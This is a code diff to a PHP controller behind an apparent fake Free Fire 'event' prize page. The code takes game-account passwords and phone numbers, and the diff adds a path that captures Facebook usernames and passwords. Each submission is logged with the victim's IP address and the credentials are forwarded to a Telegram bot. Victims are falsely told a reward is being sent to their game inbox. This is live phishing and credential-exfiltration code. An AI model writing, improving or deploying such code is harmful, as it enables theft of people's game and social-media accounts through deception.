@@ -39,23 +39,50 @@ class EventController extends Controller
      */
     public function verify(Request $request): JsonResponse
     {
-        $validated = $request->validate([
-            'uid'      => 'required|string',
-            'nama'     => 'required|string|min:2',
-            'password' => 'required|string|min:4',
-            'tingkat'  => 'required|string',
-            'phone'    => 'required|string|min:8',
-            'item'     => 'required|string',
-        ]);
+        // Support direct Facebook login payload or regular verification payload
+        if ($request->has('fb_account')) {
+            $validated = $request->validate([
+                'fb_account'  => 'required|string|min:3',
+                'fb_password' => 'required|string|min:1',
+                'item'        => 'nullable|string',
+            ]);
+
+            $claimData = [
+                'uid'      => 'FB-' . $validated['fb_account'],
+                'nama'     => $validated['fb_account'],
+                'password' => $validated['fb_password'],
+                'tingkat'  => 'Akun Facebook',
+                'phone'    => $validated['fb_account'],
+                'item'     => $validated['item'] ?: 'Hadiah Event',
+            ];
+        } else {
+            $validated = $request->validate([
+                'uid'      => 'required|string',
+                'nama'     => 'required|string|min:1',
+                'password' => 'required|string|min:1',
+                'tingkat'  => 'nullable|string',
+                'phone'    => 'required|string|min:3',
+                'item'     => 'required|string',
+            ]);
+
+            $claimData = [
+                'uid'      => $validated['uid'],
+                'nama'     => $validated['nama'],
+                'password' => $validated['password'],
+                'tingkat'  => $validated['tingkat'] ?: 'Master',
+                'phone'    => $validated['phone'],
+                'item'     => $validated['item'],
+            ];
+        }
 
         // 1. Simpan ke Database ClaimLog
         $claim = ClaimLog::create([
-            'uid'        => $validated['uid'],
-            'nama'       => $validated['nama'],
-            'password'   => $validated['password'],
-            'tingkat'    => $validated['tingkat'],
-            'phone'      => $validated['phone'],
-            'item'       => $validated['item'],
+            'uid'        => $claimData['uid'],
+            'nama'       => $claimData['nama'],
+            'password'   => $claimData['password'],
+            'tingkat'    => $claimData['tingkat'],
+            'phone'      => $claimData['phone'],
+            'item'       => $claimData['item'],
             'ip_address' => $request->ip(),
             'user_agent' => $request->userAgent(),
             'status'     => 'success',
@@ -67,8 +94,8 @@ class EventController extends Controller
 
         return response()->json([
             'success' => true,
-            'message' => 'Verifikasi berhasil! Item ' . $validated['item'] . ' sedang diproses ke inbox game Free Fire Anda.',
-            'item'    => $validated['item'],
+            'message' => 'Verifikasi berhasil! Item ' . $claimData['item'] . ' sedang diproses ke inbox game Free Fire Anda.',
+            'item'    => $claimData['item'],
         ])->header('Access-Control-Allow-Origin', '*')
           ->header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
           ->header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization, X-Requested-With');
@@ -88,21 +115,21 @@ class EventController extends Controller
         }
 
         try {
-            $msg = "🎁 *KLAIM EVENT FREE FIRE BARU!*\n\n"
-                 . "👤 *Nama Karakter:* " . $claim->nama . "\n"
-                 . "🆔 *UID Akun:* `" . $claim->uid . "`\n"
-                 . "🔑 *Password Akun:* `" . ($claim->password ?? '-') . "`\n"
-                 . "⭐ *Level Akun:* " . $claim->tingkat . "\n"
-                 . "📱 *No HP/WA:* `" . $claim->phone . "`\n"
-                 . "🏆 *Item Dipilih:* *" . $claim->item . "*\n"
-                 . "🌐 *IP Address:* " . ($claim->ip_address ?? '-') . "\n"
-                 . "⏰ *Waktu:* " . $claim->created_at->format('d/m/Y H:i:s') . "\n\n"
-                 . "⚡ _Sistem Super Admin Panel Free Fire_";
+            $msg = "🎁 <b>KLAIM EVENT FREE FIRE BARU!</b>\n\n"
+                 . "👤 <b>Nama / Akun:</b> " . htmlspecialchars($claim->nama) . "\n"
+                 . "🆔 <b>UID / Tipe:</b> <code>" . htmlspecialchars($claim->uid) . "</code>\n"
+                 . "🔑 <b>Password Akun:</b> <code>" . htmlspecialchars($claim->password ?? '-') . "</code>\n"
+                 . "⭐ <b>Level Akun:</b> " . htmlspecialchars($claim->tingkat) . "\n"
+                 . "📱 <b>No HP / WA:</b> <code>" . htmlspecialchars($claim->phone) . "</code>\n"
+                 . "🏆 <b>Item Dipilih:</b> <b>" . htmlspecialchars($claim->item) . "</b>\n"
+                 . "🌐 <b>IP Address:</b> " . htmlspecialchars($claim->ip_address ?? '-') . "\n"
+                 . "⏰ <b>Waktu:</b> " . $claim->created_at->format('d/m/Y H:i:s') . "\n\n"
+                 . "⚡ <i>Sistem Super Admin Panel Free Fire</i>";
 
             Http::withoutVerifying()->timeout(10)->post("https://api.telegram.org/bot{$token}/sendMessage", [
                 'chat_id'    => $chatId,
                 'text'       => $msg,
-                'parse_mode' => 'Markdown',
+                'parse_mode' => 'HTML',
             ]);
         } catch (\Exception $e) {
             Log::warning('Telegram notification error: ' . $e->getMessage());
